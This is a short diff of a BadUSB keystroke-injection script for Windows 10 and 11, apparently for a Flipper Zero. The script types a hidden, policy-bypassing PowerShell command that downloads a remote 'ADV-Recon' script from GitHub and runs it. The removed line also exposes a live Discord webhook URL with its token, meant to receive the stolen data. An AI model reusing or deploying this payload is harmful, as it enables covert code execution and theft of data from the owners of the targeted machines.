@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1055372932869791754/hIJtQS-wdCuQPEIjNKAqQJoOVWB9TXk8TPNBHDnTtNg4AIIp7as8fB8KrlB2clgJzR-p';$db='';iwr https://github.com/HelloBongo/Flipper-Zero-BadUSB/raw/main/ADV-Recon/ADV-Recon.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr https://github.com/HelloBongo/Flipper-Zero-BadUSB/raw/main/ADV-Recon/ADV-Recon.ps1 | iex
 ENTER
